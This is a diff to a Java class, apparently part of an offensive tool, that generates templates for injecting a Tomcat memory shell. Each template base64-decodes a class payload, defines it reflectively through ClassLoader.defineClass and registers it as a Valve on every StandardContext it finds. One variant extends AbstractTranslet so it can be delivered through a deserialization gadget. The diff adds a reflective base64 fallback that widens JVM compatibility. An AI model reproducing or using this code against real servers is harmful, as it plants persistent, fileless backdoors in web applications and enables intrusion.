@@ -9,15 +9,34 @@ public class addValve implements ImplInterface {
             "import org.apache.catalina.core.StandardContext;\n" +
             "import org.apache.catalina.core.StandardEngine;\n" +
             "import org.apache.catalina.core.StandardHost;\n" +
+            "\n" +
             "import java.lang.reflect.Field;\n" +
             "import java.lang.reflect.Method;\n" +
             "import java.util.*;\n" +
+            "\n" +
+            "\n" +
             "public class %s {\n" +
             "    private String uri;\n" +
             "    private String serverName;\n" +
             "    private ArrayList<StandardContext> standardContext_ = new ArrayList<>();\n" +
             "    private ArrayList<StandardContext> standardContext__ = new ArrayList<>();\n" +
-            "\n" +
+            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
+            "        Class base64;\n" +
+            "        byte[] value = null;\n" +
+            "        try {\n" +
+            "            base64 = Class.forName(\"java.util.Base64\");\n" +
+            "            Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n" +
+            "            value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
+            "        } catch (Exception e) {\n" +
+            "            try {\n" +
+            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
+            "                Object decoder = base64.newInstance();\n" +
+            "                value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
+            "            } catch (Exception e2) {\n" +
+            "            }\n" +
+            "        }\n" +
+            "        return value;\n" +
+            "    }\n" +
             "    public %s() {\n" +
             "        super();\n" +
             "        this.getThread();\n" +
@@ -26,7 +45,7 @@ public class addValve implements ImplInterface {
             "        Object o=null;\n" +
             "        try {\n" +
             "            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
-            "            byte[] d = java.util.Base64.getDecoder().decode(s);\n" +
+            "            byte[] d = base64Decode(s);\n" +
             "            Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
             "            Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
             "            defineClass.setAccessible(true);\n" +
@@ -182,49 +201,58 @@ public class addValve implements ImplInterface {
             "\n" +
             "import java.lang.reflect.Field;\n" +
             "import java.lang.reflect.Method;\n" +
-            "import java.util.*;\n" +
+            "import java.util.ArrayList;\n" +
+            "import java.util.HashMap;\n" +
+            "import java.util.Iterator;\n" +
+            "import java.util.Map;\n" +
             "\n" +
             "public class %s extends AbstractTranslet {\n" +
             "    private String uri;\n" +
             "    private String serverName;\n" +
             "    private ArrayList<StandardContext> standardContext_ = new ArrayList<>();\n" +
             "    private ArrayList<StandardContext> standardContext__ = new ArrayList<>();\n" +
-            "\n" +
+            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
+            "        Class base64;\n" +
+            "        byte[] value = null;\n" +
+            "        try {\n" +
+            "            base64 = Class.forName(\"java.util.Base64\");\n" +
+            "            Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n" +
+            "            value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
+            "        } catch (Exception e) {\n" +
+            "            try {\n" +
+            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
+            "                Object decoder = base64.newInstance();\n" +
+            "                value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
+            "            } catch (Exception e2) {\n" +
+            "            }\n" +
+            "        }\n" +
+            "        return value;\n" +
+            "    }\n" +
             "    public %s() {\n" +
             "        super();\n" +
             "        this.getThread();\n" +
             "        ArrayList<StandardContext> standardCtx = this.getSTC();\n" +
             "        String s = \"%s\";\n" +
-            "        Object o = null;\n" +
+            "        Object o=null;\n" +
             "        try {\n" +
             "            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
-            "            byte[] d = java.util.Base64.getDecoder().decode(s);\n" +
+            "            byte[] d = base64Decode(s);\n" +
             "            Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
             "            Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
             "            defineClass.setAccessible(true);\n" +
             "            o = ((Class) defineClass.invoke(clzLoader, d, 0, d.length)).newInstance();\n" +
-            "        } catch (Exception e) {\n" +
-            "        }\n" +
+            "        } catch (Exception e) { }\n" +
             "        for (StandardContext standardCtx_ : standardCtx) {\n" +
-            "            try {\n" +
-            "                standardCtx_.addValve((Valve) o);\n" +
-            "            } catch (Exception e) {\n" +
-            "                continue;\n" +
-            "            }\n" +
+            "            try { standardCtx_.addValve((Valve) o); }catch (Exception e){ continue; }\n" +
             "        }\n" +
             "    }\n" +
-            "\n" +
-            "    @Override\n" +
-            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}\n" +
-            "\n" +
-            "    @Override\n" +
-            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }\n" +
             "\n" +
             "    public Object getField(Object object, String fieldName) {\n" +
             "        Field declaredField;\n" +
             "        Class clazz = object.getClass();\n" +
             "        while (clazz != Object.class) {\n" +
             "            try {\n" +
+            "\n" +
             "                declaredField = clazz.getDeclaredField(fieldName);\n" +
             "                declaredField.setAccessible(true);\n" +
             "                return declaredField.get(object);\n" +
@@ -263,6 +291,7 @@ public class addValve implements ImplInterface {
             "            Iterator iterator = processors.iterator();\n" +
             "            while (iterator.hasNext()) {\n" +
             "                Object next = iterator.next();\n" +
+            "\n" +
             "                Object req = getField(next, \"req\");\n" +
             "                Object serverPort = getField(req, \"serverPort\");\n" +
             "                if (serverPort.equals(-1)) {\n" +
@@ -350,6 +379,15 @@ public class addValve implements ImplInterface {
             "                this.standardContext__.add(this.standardContext_.get(i));\n" +
             "        }\n" +
             "        return this.standardContext__;\n" +
+            "    }\n" +
+            "    @Override\n" +
+            "    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n" +
+            "\n" +
+            "    }\n" +
+            "\n" +
+            "    @Override\n" +
+            "    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n" +
+            "\n" +
             "    }\n" +
             "}";
 
